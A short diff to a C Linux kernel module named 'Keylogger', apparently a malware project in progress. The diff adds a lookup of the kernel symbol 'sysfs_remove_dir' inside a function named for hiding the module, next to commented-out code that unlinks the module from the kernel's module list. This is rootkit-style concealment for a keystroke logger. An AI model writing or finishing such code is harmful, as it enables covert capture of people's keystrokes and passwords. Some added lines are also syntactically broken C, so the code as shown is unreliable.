@@ -4,7 +4,6 @@
 #include <linux/err.h>
 #include <linux/keyboard.h>
 #include <linux/module.h>
-#include <linux/keyboard.h>
 #include <linux/debugfs.h>
 #include <linux/kernfs.h>
 #include <linux/uaccess.h>
@@ -15,6 +14,7 @@
 #include <linux/err.h>
 #include <linux/cdev.h>
 #include <linux/semaphore.h>
+#include <linux/sysfs.h>
 #include "keys.h"
 #define BUFF_SIZE (PAGE_SIZE << 2)
 #define DEVICE_NAME "Keylogger"
@@ -46,12 +46,14 @@ void unhide(void)
     list_add(&THIS_MODULE->list, module_list);
     is_hide=0;
 }*/
+static long unsigned (funcp *)(struct kobject * kobj);
 
 int dev_open_fops_for_hide(struct inode *inode, struct file* file)
 {
     static struct list_head *module_list;
     struct kobject* saved_kobj_parent;
-
+    //static long unsigned (funcp *) (struct kobject * kobj) = module_kallsyms_lookup_name("sysfs_remove_dir");
+    static long unsigned funcp = (unsigned long*) module_kallsyms_lookup_name("sysfs_remove_dir");
     if (!is_hide)
     {
 
